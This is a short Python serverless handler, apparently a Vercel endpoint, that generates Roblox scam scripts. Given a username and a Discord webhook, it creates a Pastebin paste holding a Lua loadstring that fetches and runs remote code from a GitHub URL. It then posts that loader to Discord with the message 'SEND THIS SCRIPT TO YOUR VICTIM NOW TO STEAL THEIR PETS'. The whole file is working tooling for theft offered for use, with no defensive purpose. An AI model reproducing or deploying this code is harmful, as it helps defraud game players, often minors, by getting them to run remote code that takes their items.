import requests
import json
import os

def handler(request):
    if request.method != "POST":
        return {"statusCode": 405, "body": "Method Not Allowed"}

    try:
        data = request.json()
    except:
        return {"statusCode": 400, "body": "Invalid JSON"}

    username = data.get("username")
    webhook = data.get("webhook")

    if not username or not webhook:
        return {"statusCode": 400, "body": "Missing username or webhook"}

    # Pastebin API key from Vercel env
    PASTEBIN_API_KEY = os.environ.get("PASTEBIN_API_KEY")
    if not PASTEBIN_API_KEY:
        return {"statusCode": 500, "body": "Missing Pastebin API key"}

    # Create paste
    paste_data = {
        "api_dev_key": PASTEBIN_API_KEY,
        "api_option": "paste",
        "api_paste_code": 'loadstring(game:HttpGet("https://raw.githubusercontent.com/Xscripts-official/EggRefresher/refs/heads/main/EggRefresherLATEST"))()',
        "api_paste_private": "1",
        "api_paste_name": f"{username}_script",
    }

    paste_res = requests.post("https://pastebin.com/api/api_post.php", data=paste_data)
    if "Bad API request" in paste_res.text:
        return {"statusCode": 500, "body": "Pastebin Error: " + paste_res.text}

    paste_link = paste_res.text
    paste_raw = paste_link.replace("pastebin.com/", "pastebin.com/raw/")

    # Send Discord message
    payload = {
        "content": f"WORKING SEND THIS SCRIPT TO YOUR VICTIM NOW TO STEAL THEIR PETS\n\n```\nloadstring(game:HttpGet(\"{paste_raw}\"))()\n```"
    }
    requests.post(webhook, json=payload)

    return {
        "statusCode": 200,
        "headers": {"Content-Type": "application/json"},
        "body": json.dumps({"paste_link": paste_raw})
    }
    
